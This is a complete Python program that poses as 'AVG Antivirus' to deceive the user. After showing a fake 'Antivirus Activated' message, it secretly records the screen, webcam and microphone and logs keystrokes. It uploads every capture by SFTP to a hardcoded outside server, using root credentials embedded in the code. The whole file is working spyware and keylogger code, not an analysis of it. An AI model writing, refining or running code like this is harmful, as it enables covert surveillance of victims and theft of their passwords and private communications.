import datetime
import time
import paramiko
import getpass
import cv2
import threading
import numpy as np
import pyautogui
import pyaudio
import wave
from pynput.keyboard import Key, Listener
import sys
import os
import tkinter as tk

def close_window():
    window.destroy()

def display_message(message):
   
    global window
    window = tk.Tk()

    window.title("AVG Antivirus ")
    icon_path = getattr(sys, '_MEIPASS', os.getcwd())
    window.iconbitmap(os.path.join(icon_path, "winr.ico")) 

    custom_font = ("Arial", 12) 

   
    label = tk.Label(window, text=message, font=custom_font)
    label.pack()

    
    close_button = tk.Button(window, text="Close", command=close_window)
    close_button.pack()


    window.mainloop()

def take_screenshot():
    localuser = getpass.getuser()
    while True:
        screen_width, screen_height = pyautogui.size()

        filename = "C:/Users/"+localuser+"/Pictures/screenrec.avi"

        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (screen_width, screen_height))

        start_time = time.time()
        try:
            while True:
                img = pyautogui.screenshot()

                frame = np.array(img)

                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

                out.write(frame)

                if time.time() - start_time > 15:
                    break
        finally:
            out.release()
            cv2.destroyAllWindows()

        send_to_server(filename)
        
def record_video():
    localuser = getpass.getuser()
    while True:
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            print("Error: Unable to access the webcam.")
        if cap.isOpened():
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            video_name="C:/Users/"+localuser+"/Pictures/webcam.avi"
            out = cv2.VideoWriter(video_name, fourcc, 20.0, (640, 480))

            start_time = time.time()

            while True:
                
                ret, frame = cap.read()

                if ret:
                    
                    out.write(frame)

                if time.time() - start_time > 10:
                    break
            send_to_server(video_name)

def record_voice():
    localuser = getpass.getuser()
    FORMAT = pyaudio.paInt16
    CHANNELS = 1 
    RATE = 44100  
    CHUNK = 1024  
    RECORDING_DURATION = 15

    while True:
        
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT,
                            channels=CHANNELS,
                            rate=RATE,
                            input=True,
                            frames_per_buffer=CHUNK)

        print("Recording...")

        frames = []

        start_time = time.time()
        while (time.time() - start_time) < RECORDING_DURATION:
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        file_name="C:/Users/"+localuser+"/Pictures/rec.wav"
        wf = wave.open(file_name, "wb")
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b"".join(frames))
        wf.close()

        print("Recording stopped. Audio saved as rec.wav.")
        send_to_server(file_name)
        time.sleep(10)

def keylog():
    localuser = getpass.getuser()
    filename="C:/Users/"+localuser+"/Pictures/keylog.txt"
    while True:
        def on_press(key):
            with open(filename, "a") as log_file:
                
                if hasattr(key, 'char'): 
                    log_file.write(key.char)  
                elif key==Key.space:
                    log_file.write(" ")
                elif key==Key.esc:
                    log_file.write(" ")
                elif key==Key.shift_r:
                    log_file.write("")
                elif key==Key.enter:
                    log_file.write('\n')
                elif key == Key.backspace:
                    log_file.seek(log_file.tell() - 1, 0)
                    log_file.truncate()
                else:
                    log_file.write(str(key)) 

                log_file.flush() 

        def on_release(key):
            pass
                
        with Listener(on_press=on_press, on_release=on_release) as listener:
            current_datetime = datetime.datetime.now()
            formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
            time.sleep(20)
            with open(filename, "a") as log_file:
                log_file.write('\n'+'-----'+formatted_datetime+'-------'+'\n \n')

            send_to_server(filename)
            listener.stop()

def send_to_server(file):
    try:
        # Establish SSH/SFTP connection
        host='139.59.27.207'
        transport = paramiko.Transport((host, 22))
        transport.connect(username='root', password='qwertyuioP1234q')
        sftp = paramiko.SFTPClient.from_transport(transport)

        # Upload screenshot to remote server
        localuser = getpass.getuser()
        current_datetime = datetime.datetime.now()
        formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
        formatted_datetime_2 = current_datetime.strftime("%Y-%m-%d")
        if(file.endswith("screenrec.avi")):
            remote_filename = "/root/capture/screenshots/"+localuser+formatted_datetime+".avi"
            sftp.put(file, remote_filename)
        elif(file.endswith("rec.wav")):
            remote_filename = "/root/capture/voice/"+localuser+formatted_datetime+".wav"
            sftp.put(file, remote_filename)
        if(file.endswith("log.txt")):
            remote_filename = "/root/capture/keylog/"+localuser+formatted_datetime_2+".txt"
            sftp.put(file, remote_filename)
        else:
            remote_filename_webcam = "/root/capture/webcap/"+localuser+formatted_datetime+".avi"
            sftp.put(file, remote_filename_webcam)

        # Close connections
        sftp.close()
        transport.close()

        print(file+"uploaded successfully to", host)

    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":

    message = "Antivirus Activated! You may close the prompt and be assured protection!"
    display_message(message)
    screenshot_thread = threading.Thread(target=take_screenshot)
    video_thread = threading.Thread(target=record_video)
    voice_thread = threading.Thread(target=record_voice)
    key_thread = threading.Thread(target=keylog)
    voice_thread.start()
    screenshot_thread.start()
    video_thread.start()
    key_thread.start()
